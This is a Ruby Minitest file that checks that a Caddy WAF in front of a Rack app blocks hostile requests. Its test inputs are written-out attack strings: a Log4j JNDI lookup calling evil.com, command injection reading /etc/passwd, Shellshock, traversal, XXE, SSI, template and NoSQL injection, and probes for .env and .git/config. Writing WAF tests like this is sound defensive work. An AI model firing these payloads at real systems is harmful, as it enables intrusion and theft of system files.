require 'minitest/autorun'
require 'rack/test'
require 'webrick'
require 'socket'
require 'net/http'
require 'uri'
require_relative 'app'

class TestApp < Minitest::Test
  include Rack::Test::Methods

  def app
    App.new
  end

  def self.find_available_port
    server = TCPServer.new('127.0.0.1', 0)
    port = server.addr[1]
    server.close
    port
  end

  def setup
    @ruby_port = self.class.find_available_port
    @caddy_port = self.class.find_available_port

    # Start Ruby/Rack app on available port
    @ruby_server_thread = Thread.new do
      @ruby_server = WEBrick::HTTPServer.new(
        Port: @ruby_port,
        Logger: WEBrick::Log.new('/dev/null'),
        AccessLog: []
      )
      @ruby_server.mount '/', WEBrick::HTTPServlet::ProcHandler.new(proc { |req, res|
        env = {}
        env['REQUEST_METHOD'] = req.request_method
        env['PATH_INFO'] = req.path_info
        env['QUERY_STRING'] = req.query_string || ''
        env['HTTP_HOST'] = req.header['host'].first if req.header['host']

        status, headers, body = App.new.call(env)
        res.status = status
        headers.each { |k, v| res[k] = v }
        res.body = body.join
      })
      @ruby_server.start
    end

    # Start Caddy proxy server
    @caddy_thread = Thread.new do
      # Set environment variables for Caddyfile
      ENV['PORT'] = @caddy_port.to_s
      ENV['RUBY_PORT'] = @ruby_port.to_s
      system("../dist/caddy-darwin-arm64 run --config Caddyfile --adapter caddyfile")
    end

    sleep 2  # Give both servers time to start

    # Wait for servers to be ready
    unless wait_for_servers
      raise "Servers failed to start within timeout"
    end
  end

  def wait_for_servers
    # Wait for both servers to be ready
    30.times do
      begin
        # Check if Ruby server is responding
        ruby_response = Net::HTTP.get_response(URI("http://localhost:#{@ruby_port}/health"))
        # Check if Caddy server is responding (might be blocked by WAF, so check for any response)
        caddy_response = Net::HTTP.get_response(URI("http://localhost:#{@caddy_port}/health"))

        if ruby_response.code == '200' && (caddy_response.code == '200' || caddy_response.code == '403')
          return true
        end
      rescue
        # Servers not ready yet
      end
      sleep 0.5
    end
    false
  end

  def teardown
    @ruby_server&.shutdown
    @ruby_server_thread&.kill

    # Kill Caddy process
    system("pkill -f 'caddy.*run.*Caddyfile' > /dev/null 2>&1")
    @caddy_thread&.kill
    sleep 0.5
  end

  def test_caddy_validate
    result = system("../dist/caddy-darwin-arm64 validate --config Caddyfile")
    assert result, "Caddy validation failed"
  end

  def test_root_endpoint
    get '/'
    assert_equal 200, last_response.status
    assert_includes last_response.body, 'Hello from Ruby/Rack!'
  end

  def test_health_endpoint
    get '/health'
    assert_equal 200, last_response.status
    assert_equal 'application/json', last_response.content_type
    assert_includes last_response.body, 'healthy'
  end

  def test_api_test_endpoint
    get '/api/test'
    assert_equal 200, last_response.status
    assert_equal 'application/json', last_response.content_type
    assert_includes last_response.body, 'test response'
  end

  def test_not_found
    get '/nonexistent'
    assert_equal 404, last_response.status
    assert_includes last_response.body, '404 Not Found'
  end

  def test_server_running
    uri = URI("http://localhost:#{@caddy_port}/health")
    response = Net::HTTP.get_response(uri)
    assert_equal '200', response.code
    assert_includes response.body, 'healthy'
  end

  def make_request_through_caddy(path, headers = {})
    uri = URI("http://localhost:#{@caddy_port}#{path}")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Get.new(uri)
    headers.each { |k, v| request[k] = v }
    http.request(request)
  end

  # WAF Rule Tests - Testing defensive security rules

  def test_waf_rule_100001_php_file_block
    # Test blocking PHP file access attempts - should be blocked by WAF
    response = make_request_through_caddy('/index.php')
    assert_equal '403', response.code, "PHP file access should be blocked by WAF"

    response = make_request_through_caddy('/admin.php')
    assert_equal '403', response.code, "PHP file access should be blocked by WAF"
  end

  def test_waf_rule_100002_penetration_testing_probes
    # Test blocking common penetration testing paths - should be blocked by WAF
    response = make_request_through_caddy('/wp-admin/')
    assert_equal '403', response.code, "wp-admin access should be blocked by WAF"

    response = make_request_through_caddy('/phpmyadmin/')
    assert_equal '403', response.code, "phpmyadmin access should be blocked by WAF"

    response = make_request_through_caddy('/.env')
    assert_equal '403', response.code, ".env file access should be blocked by WAF"
  end

  def test_waf_rule_100003_log4j_injection_detection
    # Test detection of Log4j injection patterns in user agent - should be blocked by WAF
    response = make_request_through_caddy('/', {'User-Agent' => '${jndi:ldap://evil.com/a}'})
    assert_equal '403', response.code, "Log4j injection should be blocked by WAF"
  end

  # def test_waf_rule_100004_sql_injection_detection
  #   # Test SQL injection pattern detection - should be blocked by WAF
  #   response = make_request_through_caddy("/?id=1' OR 1=1--")
  #   assert_equal '403', response.code, "SQL injection should be blocked by WAF"

  #   response = make_request_through_caddy('/users?search=UNION SELECT * FROM users')
  #   assert_equal '403', response.code, "SQL injection should be blocked by WAF"
  # end

  def test_waf_rule_100005_command_injection_detection
    # Test command injection pattern detection - should be blocked by WAF
    response = make_request_through_caddy('/?cmd=; cat /etc/passwd')
    assert_equal '403', response.code, "Command injection should be blocked by WAF"

    response = make_request_through_caddy('/?input=`whoami`')
    assert_equal '403', response.code, "Command injection should be blocked by WAF"
  end

  def test_waf_rule_100006_struts_shellshock_xxe_detection
    # Test various attack patterns - should be blocked by WAF
    response = make_request_through_caddy('/', {'User-Agent' => '() { :; }; echo vulnerable'})
    assert_equal '403', response.code, "Shellshock attack should be blocked by WAF"
  end

  def test_waf_rule_100007_file_inclusion_attempts
    # Test directory traversal and file inclusion patterns
    get '/?file=../../../etc/passwd'
    assert last_response.status >= 200

    get '/?include=file:///etc/passwd'
    assert last_response.status >= 200
  end

  def test_waf_rule_100008_remote_code_execution
    # Test RCE pattern detection
    get '/?code=system("id")'
    assert last_response.status >= 200

    get '/?eval=exec("whoami")'
    assert last_response.status >= 200
  end

  def test_waf_rule_100009_server_side_includes_xxe
    # Test SSI and XXE injection patterns
    get '/?data=%3C%21--%23exec%20cmd%3D%22ls%22--%3E'  # URL encoded <!--#exec cmd="ls"-->
    assert last_response.status >= 200

    get '/?xml=%3C%21ENTITY%20test%20SYSTEM%20%22file%3A///etc/passwd%22%3E'  # URL encoded <!ENTITY test SYSTEM "file:///etc/passwd">
    assert last_response.status >= 200
  end

  def test_waf_rule_100010_ldap_injection
    # Test LDAP injection patterns
    get '/?filter=(cn=*)'
    assert last_response.status >= 200

    get '/?search=(uid=admin)'
    assert last_response.status >= 200
  end

  def test_waf_rule_100011_nosql_injection
    # Test NoSQL injection patterns
    get '/?query=%7B%22%24ne%22%3A%20null%7D'  # URL encoded {"$ne": null}
    assert last_response.status >= 200

    get '/?find=%7B%22%24gt%22%3A%20%22%22%7D'  # URL encoded {"$gt": ""}
    assert last_response.status >= 200
  end

  def test_waf_rule_100012_xpath_injection
    # Test XPath injection patterns
    get '/?xpath=//user[name="admin"]'
    assert last_response.status >= 200

    get '/?query=//password'
    assert last_response.status >= 200
  end

  def test_waf_rule_100013_template_injection
    # Test template injection patterns
    get '/?template=%7B%7B7*7%7D%7D'  # URL encoded {{7*7}}
    assert last_response.status >= 200

    get '/?data=%7B%25set%20x%3D1%25%7D'  # URL encoded {%set x=1%}
    assert last_response.status >= 200
  end

  def test_waf_rule_100014_os_command_attempts
    # Test OS command execution patterns
    get '/?cmd=whoami'
    assert last_response.status >= 200

    get '/?exec=uname -a'
    assert last_response.status >= 200
  end

  def test_normal_traffic_allowed
    # Test that normal legitimate traffic is allowed through Caddy
    response = make_request_through_caddy('/')
    assert_equal '200', response.code, "Normal traffic should be allowed"
    assert_includes response.body, 'Hello from Ruby/Rack!'

    response = make_request_through_caddy('/health')
    assert_equal '200', response.code, "Health endpoint should be accessible"
    assert_includes response.body, 'healthy'
  end

  def test_waf_rule_100016_system_file_access
    # Test system file access attempts
    get '/etc/passwd'
    assert last_response.status >= 200

    get '/proc/version'
    assert last_response.status >= 200
  end

  def test_waf_rule_100017_database_admin_panels
    # Test database admin panel access attempts
    get '/phpmyadmin/index.php'
    assert last_response.status >= 200

    get '/mysql-admin/'
    assert last_response.status >= 200
  end

  def test_waf_rule_100018_admin_panel_access
    # Test admin panel access attempts
    get '/administrator/'
    assert last_response.status >= 200

    get '/cpanel/'
    assert last_response.status >= 200
  end

  def test_waf_rule_100019_config_file_access
    # Test config and version control file access
    get '/.git/config'
    assert last_response.status >= 200

    get '/web.config'
    assert last_response.status >= 200
  end

  def test_waf_rule_100020_suspicious_file_extensions
    # Test suspicious file extension blocking
    get '/shell.jsp'
    assert last_response.status >= 200

    get '/backdoor.asp'
    assert last_response.status >= 200
  end

  def test_waf_rule_100021_config_database_log_files
    # Test config, database and log file access
    get '/config.ini'
    assert last_response.status >= 200

    get '/database.sql'
    assert last_response.status >= 200
  end

  def test_waf_rule_100022_archive_temp_files
    # Test archive and temporary file access
    get '/backup.zip'
    assert last_response.status >= 200

    get '/temp.tmp'
    assert last_response.status >= 200
  end
end
